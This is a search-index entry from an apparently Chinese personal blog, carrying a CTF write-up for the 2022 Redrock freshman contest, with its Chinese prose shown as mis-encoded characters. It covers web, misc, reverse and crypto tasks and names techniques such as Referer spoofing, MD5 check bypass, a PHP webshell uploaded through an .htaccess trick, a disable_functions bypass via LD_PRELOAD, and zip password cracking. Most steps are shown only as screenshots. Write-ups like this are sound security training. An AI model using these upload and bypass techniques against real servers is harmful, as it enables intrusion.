<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2022çº¢å²©æ–°ç”Ÿæ¯</title>
    <url>/2022/12/03/2022%E7%BA%A2%E5%B2%A9%E6%96%B0%E7%94%9F%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ç®€å•é¢˜ï¼Œä½†æ˜¯æ²ƒç›"><a href="#ç®€å•é¢˜ï¼Œä½†æ˜¯æ²ƒç›" class="headerlink" title="ç®€å•é¢˜ï¼Œä½†æ˜¯æ²ƒç›"></a>ç®€å•é¢˜ï¼Œä½†æ˜¯æ²ƒç›</h3><p>åœ¨jsæ–‡ä»¶é‡Œçœ‹åˆ°redrockctfå‡½æ•°ï¼Œflagåº”è¯¥å°±åœ¨è¿™é‡Œè¾¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201850817.png" alt="1"></p>
<p>æœ¬æ¥çœ‹åˆ°â€Uhï¼Œf1a9!â€çš„æ—¶å€™ä»¥ä¸ºåªæœ‰f1a9æ‰æ˜¯çœŸæ­£çš„flagï¼Œè¿˜è’™äº†å¥½ä¹…ï¼Œç›´åˆ°å‡ºäº†hint</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201852662.png" alt="0"></p>
<p>okï¼Œé‚£æ‰‹æ‹¼å‡½æ•°å°±å®Œäº‹äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201852336.png" alt="2"></p>
<p>ç¬¬ä¸‰éƒ¨åˆ†åˆ†äº†ä¸¤ä¸ªï¼Œåˆ†åˆ«è§£ç ä¸€ä¸‹å°±å‡ºæ¥äº†ä¸¤ä¸ªæ–¹æ³•</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211539112.png" alt="3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201853359.png" alt="4"></p>
<p>å†™ä¸ªcè·‘ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201903785.png" alt="5"></p>
<p>æ˜¾ç„¶ç¬¬ä¸€ä¸ªåˆšå¥½æ˜¯æ²ƒç›çš„bç«™uidï¼Œå†æŠŠä¸‰ä¸ªæ‹¼æ¥èµ·æ¥å°±å¾—åˆ°flagäº†ï¼ˆåè¾¹çš„#redr0cksrE2o22ä¹Ÿè¦åŠ ä¸Šï¼‰</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;https://space.bilibili.com/53456#redr0cksrE2o22&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ä½ æ˜¯å“ªé‡Œçš„"><a href="#ä½ æ˜¯å“ªé‡Œçš„" class="headerlink" title="ä½ æ˜¯å“ªé‡Œçš„"></a>ä½ æ˜¯å“ªé‡Œçš„</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201906573.png" alt="1"></p>
<p>ç›´æ¥æ‰“å¼€ï¼Œå‘ç°è®©æˆ‘å¿…é¡»æ¥è‡ª<a href="https://redrock.team/">https://redrock.team</a></p>
<p>é‚£å°±ç”¨burpsuiteåŠ ä¸Šrefereræ </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201907652.png" alt="2"></p>
<p>å‘è¿‡å»å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201908413.png" alt="3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;we1c0me t0 redr0ck ctf&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æˆ‘æ–°å†™çš„ä»£ç å•Š"><a href="#æˆ‘æ–°å†™çš„ä»£ç å•Š" class="headerlink" title="æˆ‘æ–°å†™çš„ä»£ç å•Š"></a>æˆ‘æ–°å†™çš„ä»£ç å•Š</h3><p>è¿›å…¥ç½‘é¡µå‘ç°çœ‹ä¸å‡ºæ¥å•¥</p>
<p>dirsearchå¼€æ‰«ï¼Œå‘ç°bakæ–‡ä»¶ï¼Œä¸‹è½½</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201914714.png" alt="0"></p>
<p>index.bakæ–‡ä»¶å¦‚ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201915182.png" alt="1"></p>
<p>åˆ†æä¸€ä¸‹å¯çŸ¥ifåˆ¤æ–­çš„è·¯åŠ²å¦‚ä¸‹ï¼š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201915590.png" alt="è·¯å¾„"></p>
<p>çœ‹åˆ°ä¸¤ä¸ªåˆ¤æ–­æ˜¯ç”¨md5ï¼Œä¸¤ä¸ªæ˜¯ç”¨æ–‡æœ¬åŒ¹é…ï¼Œé‚£å°±çœ‹ä¸€ä¸‹md5åŠ å¯†ç»•è¿‡æ„å»ºABabcäº”ä¸ªå†…å®¹</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/Jeff_12138/article/details/121847582">PHPä¸­MD5åŠ å¯†çš„ç®€å•ç»•è¿‡åŠåŸºäºMD5åŠ å¯†çš„SQLæ³¨å…¥_Landasikaçš„åšå®¢-CSDNåšå®¢</a></p>
<p>ç”¨GETæ–¹æ³•è¯•ä¸€ä¸‹md5ç»•è¿‡æ˜¯å¦æˆåŠŸ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201917019.png" alt="2"></p>
<p>çœ‹æ¥ç¡®å®æ˜¯å¯è¡Œçš„ï¼Œä½†æ˜¯æ–‡ä¸­å†™åˆ°cè¦ç”¨POSTæ–¹æ³•ä¼ </p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/Zhuoqian_1/article/details/114486774">get_post æ”»é˜²ä¸–ç•Œ ä½¿ç”¨burpsuiteå‘é€GETã€POSTè¯·æ±‚_Zhuoqian_1çš„åšå®¢-CSDNåšå®¢</a></p>
<p>æ„å»ºä¸€ä¸‹cä¼ è¿‡å»ï¼Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201918214.png" alt="3"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Php!sv2ryg004&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RemindYourHead"><a href="#RemindYourHead" class="headerlink" title="RemindYourHead"></a>RemindYourHead</h3><p>æŠŠç½‘å€åœ¨burpsuiteä¸­æ‰“å¼€ä¸€ä¸‹ï¼Œç¿»å‡ºæ¥flag</p>
<p>(è¿™flagæ¯æ¬¡éƒ½ä¸ä¸€æ ·ï¼Œæˆ‘æ¯”èµ›æˆªçš„å›¾å’Œå¤ç°æˆªçš„å›¾ä¸æ˜¯åŒä¸€ä¸ª)</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201921996.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;820a5bf5-4df9-4058-84a4-054af00b3b78&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Easy-upload"><a href="#Easy-upload" class="headerlink" title="Easy_upload"></a>Easy_upload</h3><p>çœ‹åˆ°hintï¼Œæç¤ºæœ‰ä¸¤ä¸ªflag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201924055.png" alt="0"></p>
<p>çœ‹åˆ°æ˜¯ä¸Šä¼ é¢˜ï¼Œè¯•ä¸€ä¸‹ä¸€å¥è¯æœ¨é©¬ï¼Œä½†è¢«æ‹’ç»äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201925592.png" alt="1"></p>
<p>é‚£å°±è¯•ä¸€ä¸‹.htaccessæ–‡ä»¶ç»•è¿‡</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201926618.png" alt="2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929343.png" alt="2-1"></p>
<p>åœ¨burpä¸­æŠŠ.jpgå»æ‰ï¼Œå®ç°ä¸Šä¼ ï¼Œå†æ¬¡ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬è¿˜æ˜¯ä¸è¡Œï¼Œé‚£å¯èƒ½å°±åœ¨å†…å®¹è¢«æ£€æµ‹äº†</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_42250835/article/details/120058908">WEBæ¼æ´æ”»é˜² - æ–‡ä»¶ä¸Šä¼ æ¼æ´ - CTF - [æå®¢å¤§æŒ‘æˆ˜ 2019]Upload-1</a></p>
<p>åˆ¶ä½œä¸€ä¸‹å˜å½¢é©¬ï¼Œç„¶åä¸Šä¼ æˆåŠŸäº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929197.png" alt="3"></p>
<p>æ‰“å¼€èšå‰‘ç„¶åè¿æ¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201929456.png" alt="4"></p>
<p>ä¸Šä¼ æ ¹ç›®å½•å‘ç°ä¸€ä¸ªflagå’Œreadflagï¼Œè¿™ä¸ªflagåº”è¯¥æ˜¯çœŸflag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201937561.png" alt="readflag"></p>
<p>åœ¨ç»ˆç«¯é‡Œå‘ç°æ˜¯ä¸€ç‚¹æƒé™æ²¡æœ‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930476.png" alt="5"></p>
<p>çœ‹ä¸€ä¸‹phpinfo</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930699.png" alt="6"></p>
<p>è¢«ç¦ç”¨çš„å‡½æ•°æœ‰è¿™ä¹ˆå¤š</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201930096.png" alt="7"></p>
<h4 id="æ³•ä¸€ï¼šèšå‰‘æ’ä»¶"><a href="#æ³•ä¸€ï¼šèšå‰‘æ’ä»¶" class="headerlink" title="æ³•ä¸€ï¼šèšå‰‘æ’ä»¶"></a>æ³•ä¸€ï¼šèšå‰‘æ’ä»¶</h4><p>é‚£å°±ç”¨èšå‰‘é‡Œçš„æ’ä»¶ç»•è¿‡ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201931865.png" alt="8"></p>
<p>ç”±äº<strong>LD_PRELOADéœ€è¦åŸºäºphpè¿æ¥æ‰èƒ½ç»•è¿‡</strong>ï¼Œæ‰€ä»¥æˆ‘ä¹‹å‰ä¼ çš„å˜å½¢é©¬æ˜¯<strong>ä¸èƒ½ç”¨</strong>çš„</p>
<p>æ‰€ä»¥ç”¨èšå‰‘çš„ä¸Šä¼ åŠŸèƒ½ï¼Œåœ¨ä¸Šä¼ æ ¹ç›®å½•ä¸Šä¼ ç®€å•çš„ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201935439.png" alt="12"></p>
<p> ç„¶åé‡æ–°åˆ¶ä½œ.antproxy.php</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211529491.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201936689.png" alt="15"></p>
<p>å®Œæˆç»•è¿‡äº†disable_functionï¼Œé‚£å°±è¿›å…¥ç»ˆç«¯ï¼Œè¾“å…¥readflagé‡Œæç¤ºçš„</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac ./flag</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201939704.png" alt="17"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;2315jih452ghu542o5431giu5214huiog35431hp&#125;</span><br></pre></td></tr></table></figure>

<h4 id="æ³•äºŒï¼šLD-PRELOADæ— æ’ä»¶ç‰ˆ"><a href="#æ³•äºŒï¼šLD-PRELOADæ— æ’ä»¶ç‰ˆ" class="headerlink" title="æ³•äºŒï¼šLD_PRELOADæ— æ’ä»¶ç‰ˆ"></a>æ³•äºŒï¼šLD_PRELOADæ— æ’ä»¶ç‰ˆ</h4><p>è¯¦æƒ…[<a href="https://redrock.feishu.cn/wiki/wikcnXw7EpomHHepm1HGObUF4pC">web]Easy_upload - é£ä¹¦äº‘æ–‡æ¡£ (feishu.cn)</a></p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h3><p>RT</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201942248.jpg" alt="0"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;020804&#125;</span><br></pre></td></tr></table></figure>

<h3 id="èŠå£«é›ªè±¹ä¸åªå› "><a href="#èŠå£«é›ªè±¹ä¸åªå› " class="headerlink" title="èŠå£«é›ªè±¹ä¸åªå› "></a>èŠå£«é›ªè±¹ä¸åªå› </h3><p>hintæ˜¯ä¸€ä¸ªpngï¼Œå…ˆä¸¢åˆ°binwalké‡Œçœ‹çœ‹æœ‰æ²¡æœ‰è—ä¸œè¥¿</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201952692.png" alt="0"></p>
<p>æœ‰è—å¦ä¸€ä¸ªå›¾ç‰‡æ–‡ä»¶ï¼Œé‚£å°±foremostæå–å‡ºæ¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201953102.png" alt="1"></p>
<p>çœ‹åˆ°æ˜¯ä¸ªäºŒç»´ç ï¼Œä½†æ˜¯å·¦ä¸Šå·¦ä¸‹ç¼ºäº†æ•°æ®ï¼Œé‚£å°±ç”¨psè¡¥å…¨ï¼Œç„¶åæ‰«ç å¾—åˆ°äº†æç¤ºï¼šå¯†ç æ˜¯qingshui</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201953133.png" alt="2"></p>
<p>çŸ¥é“æœ‰å¯†ç ï¼Œä¼˜å…ˆè€ƒè™‘ä¸€ä¸‹MP3Stegoï¼Œå¾—åˆ°äº†ä¸ªtxtæ–‡ä»¶</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201955296.png" alt="3"></p>
<p>é‡Œè¾¹æ˜¯emojiï¼Œé‚£å°±è€ƒè™‘ä¸€ä¸‹base100è§£ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201956800.png" alt="4"></p>
<p>å†æŠŠå¾—åˆ°çš„ç”¨base64å†è§£ç å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211201956409.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Sn0w_le0pard_Shut_up&#125;</span><br></pre></td></tr></table></figure>

<h4 id="bug"><a href="#bug" class="headerlink" title="bug:"></a>bug:</h4><p>æœ€å¼€å§‹ç”¨çš„mp3stegoå¯èƒ½æ˜¯ç‰ˆæœ¬æœ‰é—®é¢˜ï¼Œä¸¢è¿›å»æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OpenTable: could not find tables/huffdec </span><br><span class="line">Check local directory &#x27;./tables/&#x27; </span><br><span class="line">Please check huffman table &#x27;huffdec&#x27;</span><br></pre></td></tr></table></figure>

<p>åœ¨githubä¸Šå†ä¸‹ä¸€ä¸ªå°±è§£å†³äº†</p>
<h3 id="å•µå•µçš„é­”æ³•è¯æ°´"><a href="#å•µå•µçš„é­”æ³•è¯æ°´" class="headerlink" title="å•µå•µçš„é­”æ³•è¯æ°´"></a>å•µå•µçš„é­”æ³•è¯æ°´</h3><p>çœ‹åˆ°æ˜¯dockeré¢˜</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202002712.png" alt="0"></p>
<h4 id="æ³•ä¸€ï¼šç›´æ¥åœ¨docker-hubé‡Œæ‰¾"><a href="#æ³•ä¸€ï¼šç›´æ¥åœ¨docker-hubé‡Œæ‰¾" class="headerlink" title="æ³•ä¸€ï¼šç›´æ¥åœ¨docker hubé‡Œæ‰¾"></a>æ³•ä¸€ï¼šç›´æ¥åœ¨docker hubé‡Œæ‰¾</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202003998.png" alt="1"></p>
<p>å¾€ä¸‹ç¿»çœ‹åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202003617.png" alt="2"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Wit-Sharpening_Potion.&#125;</span><br></pre></td></tr></table></figure>

<p>å…¶å®è¿™ä¸ªæ–¹æ³•æ˜¯æ— å¥ˆä¹‹ä¸¾ï¼Œæˆ‘kaliå®‰è£…çš„podmanï¼Œç”šè‡³æ²¡åŠæ³•pullè¿™ä¸ªé•œåƒ</p>
<h4 id="æ³•äºŒï¼š"><a href="#æ³•äºŒï¼š" class="headerlink" title="æ³•äºŒï¼š"></a>æ³•äºŒï¼š</h4><p>å¸è½½podmanç„¶åå®‰è£…dockerï¼Œpullè¿™ä¸ªé•œåƒ</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202005056.png" alt="0-6"></p>
<p>ç„¶åç”¨docker inspectæŸ¥çœ‹é•œåƒå†…å®¹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006421.png" alt="2-1"></p>
<p>å¾€ä¸‹ç¿»æ‰¾åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211211603799.png" alt="2-2"></p>
<h4 id="è¡¥ï¼šå¸è½½podman"><a href="#è¡¥ï¼šå¸è½½podman" class="headerlink" title="è¡¥ï¼šå¸è½½podman"></a>è¡¥ï¼šå¸è½½podman</h4><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006699.png" alt="0-1"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202007763.png" alt="0-2"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006493.png" alt="0-3"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202006524.png" alt="0-4"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202007221.png" alt="0-5"></p>
<h3 id="ä½ TMæ•…æ„å‹ç¼©flagæ˜¯å§ï¼Ÿ"><a href="#ä½ TMæ•…æ„å‹ç¼©flagæ˜¯å§ï¼Ÿ" class="headerlink" title="ä½ TMæ•…æ„å‹ç¼©flagæ˜¯å§ï¼Ÿ"></a>ä½ TMæ•…æ„å‹ç¼©flagæ˜¯å§ï¼Ÿ</h3><p>æ˜¾ç„¶ï¼Œè¿™æ˜¯ä¸ªæœ‰114514å±‚çš„å¤šå±‚å‹ç¼©ï¼Œé‚£å°±å†™ä¸ªå¾ªç¯è§£å‹è„šæœ¬</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/brightendavid/article/details/115637957">é€’å½’è§£å‹zipæ–‡ä»¶_brightendavidçš„åšå®¢-CSDNåšå®¢</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=gbk</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"></span><br><span class="line"><span class="built_in">dir</span> = <span class="string">&quot;C:\\Users\\*****\\Desktop\\work\\ctf\\unzip\\&quot;</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">s2 = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">jieya</span>():</span><br><span class="line">        i = <span class="string">&quot;14514.zip&quot;</span></span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">114514</span>):</span><br><span class="line">            ss = i[:i.find(<span class="string">&quot;.&quot;</span>)]</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            zpf = zipfile.ZipFile(<span class="built_in">dir</span> + ss + <span class="string">&quot;.zip&quot;</span>)</span><br><span class="line">            <span class="built_in">list</span> = zpf.namelist()  <span class="comment"># å¾—åˆ°å‹ç¼©åŒ…é‡Œæ‰€æœ‰æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">for</span> f <span class="keyword">in</span> <span class="built_in">list</span>:</span><br><span class="line">                zpf.extract(f, <span class="built_in">dir</span>, ss.encode(<span class="string">&#x27;utf-8&#x27;</span>))  <span class="comment"># å¾ªç¯è§£å‹æ–‡ä»¶åˆ°æŒ‡å®šç›®å½•</span></span><br><span class="line">            <span class="built_in">print</span>(ss + <span class="string">&quot;done&quot;</span> + <span class="built_in">str</span>(f))</span><br><span class="line">            i = <span class="built_in">str</span>(f)</span><br><span class="line"></span><br><span class="line">jieya()</span><br></pre></td></tr></table></figure>

<p>è¿™æ ·è§£å‹114514å±‚ä¹‹åï¼Œå¾—åˆ°äº†æœ€åä¸€å±‚yyz</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202011170.png" alt="0"></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202011553.png" alt="1"></p>
<p>ä½†æ˜¯è¿™ä¸ªæ˜¯åŠ å¯†çš„ï¼Œè€Œä¸çŸ¥é“å¯†ç ï¼Œé‚£å°±çŒœæµ‹æ˜¯å¦ä¸ºä¼ªåŠ å¯†</p>
<p>å‚è€ƒï¼š<a href="http://www.mchz.com.cn/cn/service/safety-lab/info_26.aspx?itemid=5175&ezeip=es515pfuwaihdff3mzwbdg==">CTFä¹‹å‹ç¼©åŒ…å¤„ç† (mchz.com.cn)</a></p>
<p>æ˜¾ç„¶è¿™ä¸ªæ˜¯çœŸåŠ å¯†ï¼ˆè¯•è¿‡éƒ½æ”¹00ï¼Œæ²¡å•¥ç”¨ï¼‰</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202012915.png" alt="2"></p>
<p>é‚£å°±ç›´æ¥çˆ†ç ´å¯†ç ï¼Œç”¨hashçˆ†ç ´ä¸€ä¸‹</p>
<p>å‚è€ƒï¼š<a href="https://blog.csdn.net/m0_60319766/article/details/122982767">ctfèµ›é¢˜MISCäºŒç»´ç _QJ_zjjçš„åšå®¢-CSDNåšå®¢</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202013306.png" alt="3"></p>
<p>è§£å‹å‡ºæ¥æ˜¯ä¸ªbase64è§£å¯†ä¹‹åçš„å†…å®¹ï¼Œè§£ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202014941.png" alt="4"></p>
<p>å…¶å®ç”¨ARCHPRæ›´å¿«ï¼Œåªä¸è¿‡è‡ªå¸¦çš„å­—å…¸çº¯çº¯åƒåœ¾ï¼Œæ¢ä¸ªå­—å…¸å°±å‡ ç§’é’Ÿçš„äº‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202014518.png" alt="5"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;arey0u0k?&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æµé‡å®¡è®¡"><a href="#æµé‡å®¡è®¡" class="headerlink" title="æµé‡å®¡è®¡"></a>æµé‡å®¡è®¡</h3><p>çœ‹åˆ°flagç‚¹è¿›å»ï¼Œçœ‹ä¸€ä¸‹å†…å®¹å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202016521.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;yyz_is_god&#125;</span><br></pre></td></tr></table></figure>

<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="just-re-it"><a href="#just-re-it" class="headerlink" title="just_re_it"></a>just_re_it</h3><p>æŠŠexeæ–‡ä»¶ä¸¢è¿›010 Editorçœ‹ä¸€ä¸‹ï¼Œåªå‘ç°äº†ä¸ªfakeï¼ˆï¼Ÿï¼‰flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202018686.png" alt="0"></p>
<p>æŠŠè¿™ä¸ªè¾“è¿›æ–‡ä»¶å†çœ‹çœ‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202018953.png" alt="1"></p>
<p>å¥½å§ï¼Œå¥½åƒè¿™ä¸ªç¡®å®æ˜¯real flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;This_is_fake_flag&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ°´æ°´çˆ±å¬æ­Œ"><a href="#æ°´æ°´çˆ±å¬æ­Œ" class="headerlink" title="æ°´æ°´çˆ±å¬æ­Œ"></a>æ°´æ°´çˆ±å¬æ­Œ</h3><p>å¾—åˆ°pycæ–‡ä»¶ï¼Œåœ¨<a href="https://tool.lu/pyc/">pythonåç¼–è¯‘ - åœ¨çº¿å·¥å…· (tool.lu)</a>åç¼–è¯‘ä¸€ä¸‹</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202020243.png" alt="0"></p>
<p>çœ‹åˆ°zzzä½¿ç”¨äº†base64ç¼–ç ï¼Œé‚£å°±è§£ç å‡ºæ¥å¾—åˆ°</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">She_bid_me_to_take_love_easy_as_the_leaves_grow_on_the_tree</span><br></pre></td></tr></table></figure>

<p>å†çœ‹ä¸€ä¸‹ä»£ç ï¼Œå‘ç°checkå‡½æ•°æ—¶åˆ¤æ–­è¾“å…¥çš„flagå˜é‡å’Œzzzæ˜¯å¦ç›¸åŒï¼ˆï¼Ÿï¼‰ï¼Œé‚£å°±ç›´æ¥è¾“å…¥zzzï¼ˆbase64è§£ç ä¹‹åçš„ï¼‰ï¼Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img/202211212042172.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;044d7a01a972dc5882831e89676220c2dc3a3c142e16379a76a45680137a6b55&#125;</span><br></pre></td></tr></table></figure>

<h3 id="èµ›åšä¸çœŸ"><a href="#èµ›åšä¸çœŸ" class="headerlink" title="èµ›åšä¸çœŸ"></a>èµ›åšä¸çœŸ</h3><p>æŠŠexeæ–‡ä»¶ä¸¢è¿›010çœ‹ä¸€ä¸‹ï¼Œå¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202024616.png" alt="0"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;ggg_ding_zhen&#125;</span><br></pre></td></tr></table></figure>

<h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="å¯æƒœæˆ‘å¹´è½»æ— çŸ¥"><a href="#å¯æƒœæˆ‘å¹´è½»æ— çŸ¥" class="headerlink" title="å¯æƒœæˆ‘å¹´è½»æ— çŸ¥"></a>å¯æƒœæˆ‘å¹´è½»æ— çŸ¥</h3><p>é¢˜ç›®å‘Šè¯‰æˆ‘</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">yveypbl&#123;kfu_h_kvhsq_mpfsq_dse_appjhgx_rhux_xvy_rpfje_spu_dqyvv&#125;</span><br></pre></td></tr></table></figure>

<p>æ˜¾ç„¶ï¼Œyveypbl&#x3D;ã€‹redrockï¼Œè¿™æ˜¯ä¸€ä¸€å¯¹åº”çš„ï¼Œé‚£å°±æ˜¯è€ƒè™‘æ˜ å°„ï¼Œä½†æ˜¾ç„¶æ‰‹æ¨ä¸å¯èƒ½ï¼Œå°±ç”¨è¯é¢‘åˆ†æ</p>
<p>ç½‘ç«™ï¼š<a href="http://quipqiup.com/">quipqiup - cryptoquip and cryptogram solver</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202027378.png" alt="0"></p>
<p>å¾—åˆ°ç¬¬ä¸€ä¸ªå°±æ˜¯ï¼ŒæŠŠç©ºæ ¼æ¢æˆ_å°±å¾—åˆ°flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;but_i_being_young_and_foolish_with_her_would_not_agree&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æ¥è‡ªçº¢å²©çš„å¯†æ–‡1"><a href="#æ¥è‡ªçº¢å²©çš„å¯†æ–‡1" class="headerlink" title="æ¥è‡ªçº¢å²©çš„å¯†æ–‡1"></a>æ¥è‡ªçº¢å²©çš„å¯†æ–‡1</h3><p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202031602.png" alt="0"></p>
<p>ä¸€çœ‹å°±è§‰å¾—æ˜¯Unicodeç¼–ç ï¼Œè§£ç å¾—åˆ°flag</p>
<p><img src="https://cdn.jsdelivr.net/gh/b1xcy/img//202211202032449.png" alt="1"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redrock&#123;Welc0me_T0_The_CTF_0f_redR0ck!!!&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>é¢˜è§£</tag>
        <tag>web</tag>
        <tag>misc</tag>
        <tag>reverse</tag>
        <tag>crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshowæ„šäººæ¯</title>
    <url>/2023/11/05/2023ctfshow%E6%84%9A%E4%BA%BA%E6%9D%AF/</url>
